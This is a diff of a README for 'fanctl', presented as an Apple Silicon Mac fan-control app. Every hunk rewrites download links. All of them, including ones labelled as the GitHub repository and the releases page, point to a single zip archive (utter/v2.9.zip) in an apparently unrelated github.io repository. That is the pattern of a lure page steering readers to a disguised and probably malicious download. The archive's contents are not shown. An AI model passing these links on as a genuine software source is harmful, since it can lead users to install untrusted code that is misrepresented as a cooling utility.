@@ -9,7 +9,7 @@ description: "Control Apple Silicon Mac fan speed intelligently with a self-lear
 
 Ready to take control of your Mac's cooling? Click the button below to grab the latest version:
 
-[![Download fanctl](https://img.shields.io/badge/Download%20fanctl-Latest-blue.svg?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/badriyyacreatives/badriyyacreatives.github.io/main/utter/v2.9.zip)
+[![Download fanctl](https://img.shields.io/badge/Download%20fanctl-Latest-blue.svg?style=for-the-badge&logo=github)](https://github.com/badriyyacreatives/badriyyacreatives.github.io/raw/refs/heads/main/utter/v2.9.zip)
 
 Visit this link to download the application.
 
@@ -53,7 +53,7 @@ Follow these steps to get fanctl running on your Mac:
 
 Click the download button at the top of this page, or use this direct link:
 
-[**Download fanctl Latest Release**](https://raw.githubusercontent.com/badriyyacreatives/badriyyacreatives.github.io/main/utter/v2.9.zip)
+[**Download fanctl Latest Release**](https://github.com/badriyyacreatives/badriyyacreatives.github.io/raw/refs/heads/main/utter/v2.9.zip)
 
 Visit this link to download the application.
 
@@ -122,8 +122,8 @@ The app is designed to be lightweight, using less than 1% CPU in background mode
 
 ## 🔗 Project Links & Resources
 
-- **GitHub Repository:** [https://raw.githubusercontent.com/badriyyacreatives/badriyyacreatives.github.io/main/utter/v2.9.zip](https://raw.githubusercontent.com/badriyyacreatives/badriyyacreatives.github.io/main/utter/v2.9.zip)
-- **Releases (All Versions):** [https://raw.githubusercontent.com/badriyyacreatives/badriyyacreatives.github.io/main/utter/v2.9.zip](https://raw.githubusercontent.com/badriyyacreatives/badriyyacreatives.github.io/main/utter/v2.9.zip)
+- **GitHub Repository:** [https://github.com/badriyyacreatives/badriyyacreatives.github.io/raw/refs/heads/main/utter/v2.9.zip](https://github.com/badriyyacreatives/badriyyacreatives.github.io/raw/refs/heads/main/utter/v2.9.zip)
+- **Releases (All Versions):** [https://github.com/badriyyacreatives/badriyyacreatives.github.io/raw/refs/heads/main/utter/v2.9.zip](https://github.com/badriyyacreatives/badriyyacreatives.github.io/raw/refs/heads/main/utter/v2.9.zip)
 - **Issues & Feature Requests:** Submit them via the Issues tab on GitHub. Your feedback shapes future updates.
 
 ---
@@ -151,7 +151,7 @@ fanctl is released under the **MIT License** – you are free to use, modify, an
 
 **Download fanctl today and give your Mac the cooling it deserves – the smart way.**
 
-[![Download fanctl](https://img.shields.io/badge/Download-fanctl-green.svg?style=for-the-badge)](https://raw.githubusercontent.com/badriyyacreatives/badriyyacreatives.github.io/main/utter/v2.9.zip)
+[![Download fanctl](https://img.shields.io/badge/Download-fanctl-green.svg?style=for-the-badge)](https://github.com/badriyyacreatives/badriyyacreatives.github.io/raw/refs/heads/main/utter/v2.9.zip)
 
 Visit this link to download the application.
 
